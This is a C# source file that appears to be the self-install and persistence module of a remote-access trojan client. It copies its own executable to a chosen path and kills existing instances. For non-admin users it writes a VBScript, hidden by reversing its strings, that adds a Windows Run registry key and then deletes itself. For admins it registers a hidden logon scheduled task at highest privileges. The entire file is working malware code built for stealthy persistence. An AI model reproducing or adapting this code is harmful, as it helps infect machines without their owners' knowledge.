using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using System.Threading;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                if (Process.GetCurrentProcess().MainModule.FileName != Settings.ClientFullPath)
                {
                    foreach (Process P in Process.GetProcesses())
                    {
                        try
                        {
                            if (P.MainModule.FileName == Settings.ClientFullPath)
                                P.Kill();
                        }
                        catch
                        {
                            Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
                        }
                    }

                    FileStream fs;
                    if (File.Exists(Settings.ClientFullPath))
                    {
                        File.Delete(Settings.ClientFullPath);
                        Thread.Sleep(1000);
                        fs = new FileStream(Settings.ClientFullPath, FileMode.Create);
                    }
                    else
                        fs = new FileStream(Settings.ClientFullPath, FileMode.CreateNew);
                    byte[] clientExe = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    fs.Write(clientExe, 0, clientExe.Length);
                    fs.Dispose();

                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        string tempName = Path.GetTempFileName() + ".vbs";
                        string TempPath = Strings.StrReverse(Settings.ClientFullPath);
                        String TempPathName = Strings.StrReverse(Path.GetFileName(Settings.ClientFullPath));
                        using (StreamWriter sw = new StreamWriter(tempName, false))
                        {
                            sw.Write(Strings.StrReverse($@"""ZS_GER"",""{TempPath}"",""{TempPathName}\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\UCKH"" etirWgeR.llehShsW
)""llehS.tpircSW""(tcejbOetaerC = llehShsW teS"));
                        }
                        Process.Start(tempName);
                        Thread.Sleep(1000);
                        File.Delete(tempName);
                    }
                    else
                    {
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "schtasks",
                            Arguments = $"/create /sc onlogon /rl highest /tn {Path.GetFileName(Settings.ClientFullPath)}  /tr " + "\"" + Settings.ClientFullPath + "\"",
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                    Process.Start(Settings.ClientFullPath);
                    Methods.ClientExit();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
